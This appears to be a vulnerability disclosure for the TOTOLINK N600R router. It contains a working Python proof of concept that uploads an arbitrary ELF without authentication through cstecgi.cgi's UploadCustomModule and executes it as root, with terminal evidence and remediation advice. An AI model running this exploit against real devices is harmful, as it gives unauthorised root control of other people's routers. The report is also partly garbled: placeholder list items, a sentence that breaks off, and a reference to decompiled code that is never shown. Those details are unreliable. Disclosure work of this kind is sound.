# TOTOLINK N600R V4.3.0cu.7866_B20220506 was discovered to contain an unauthenticated CGI upload and execution vulnerability

## Overview

- Vendor: TOTOLINK
- Product: N600R
- Version: V4.3.0cu.7866_B20220506
- Component: cstecgi.cgi setting/UploadCustomModule
- Vulnerability Class: CWE-306 missing authentication / CWE-434 unrestricted upload / CWE-78 command execution
- Manufacturer: https://www.totolink.net/

## Affected version

- Package.
- Member.
- `cstecgi.cgi`.
- MIPS big-endian; lighttpd + `/web_cste/cgi-bin/cstecgi.cgi`.

## Vulnerability details

`cstecgi.cgi` `main` skips token/cookie verification when the `topicurl`
contains `UploadCustomModule` (or when `/var/kkkkkk` exists). The handler
base64-decodes `data.File`, verifies the attacker-supplied `FileMd5`, and
writes `/var/custom.cgi` with mode 0777 via `system("cp ... && chmod ...")`.
The shipped symlink `/web_cste/cgi-bin/custom.cgi -> /var/custom.cgi` makes
the uploaded file executable by lighttpd as root.

## PoC

```python
import base64, hashlib, json, requests

payload = open("custom_cgi_payload", "rb").read()  # any small ELF
body = {
    "topicurl": "setting/UploadCustomModule",
    "Action": "GetCustomModule",
    "data": {
        "File": base64.b64encode(payload).decode(),
        "FileMd5": hashlib.md5(payload).hexdigest(),
        "FileUrl": "http://<router>/cgi-bin/custom.cgi",
    },
}
r = requests.post("http://<router>/cgi-bin/cstecgi.cgi", json=body, timeout=10)
print(r.text)
print(requests.get("http://<router>/cgi-bin/custom.cgi", timeout=10).text)
```

## Reproduction and terminal evidence

Environment: unpacked N600R rootfs + qemu-mips-static + chroot. The test
copy changes only `main`'s apmib-failure branch to reach the handler; the
`UploadCustomModule` handler itself is unchanged. No token/cookie is sent and
`/var/kkkkkk` is removed.

Terminal transcript:

```
POST /cgi-bin/cstecgi.cgi (no token) -> 200 {"Result": "Success"}
/var/custom.cgi exists, mode 0777, size 1108
GET /cgi-bin/custom.cgi -> 200, body: PWNED
```

The uploaded payload was a 1.1 KB static MIPS big-endian ELF that writes

## Verification

The vulnerable handler in the stock `cstecgi.cgi setting/UploadCustomModule` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

Unauthenticated root code execution and persistence. The same `File` field
also has a separate large-input stack overflow (CWE-121).

## Remediation

- Require a valid session/token for `UploadCustomModule`; remove the
  `strstr` bypass.
- Do not write executable files into a CGI-enabled directory.
- Verify a vendor signature, not a caller-supplied MD5.
- Remove the `/web_cste/cgi-bin/custom.cgi` symlink.

## Known CVE relation

- CVE-2026-51723 (T6, same class), CVE-2026-114575 (A950RG `FileMd5`
  injection), CVE-2025-46060 (same N600R version, different `UPLOAD_FILENAME`
  overflow). NVD N600R does not list this `UploadCustomModule`/`custom.cgi`
  chain (2026-11-06).

## Status and disclosure

Dynamic confirmation (qemu-user HTTP end-to-end). Candidate 0-day; CVE application in progress.

## Additional Information

```markdown
### Vendor
TOTOLINK

### Product
N600R

### Version or Commit
V4.3.0cu.7866_B20220506

### Vulnerability Class
CWE-306 missing authentication / CWE-434 unrestricted upload / CWE-78 command execution

### CVE_status
CVE application in progress

### Description
cstecgi.cgi skips token/cookie verification when the topicurl contains UploadCustomModule. The handler base64-decodes data.File, verifies an attacker-supplied FileMd5, writes /var/custom.cgi with mode 0777 and executes it.

### Affected_component
cstecgi.cgi setting/UploadCustomModule

### Attack_vector
Unauthenticated POST to cstecgi.cgi with topicurl=setting/UploadCustomModule and a base64 File.

### Product_version
N600R V4.3.0cu.7866_B20220506

### Reference
- https://www.totolink.net/
- https://github.com/vuln-1/vuln/blob/main/TOTOLINK/N600R_V4.3.0cu.7866_B20220506/report-1.md
```
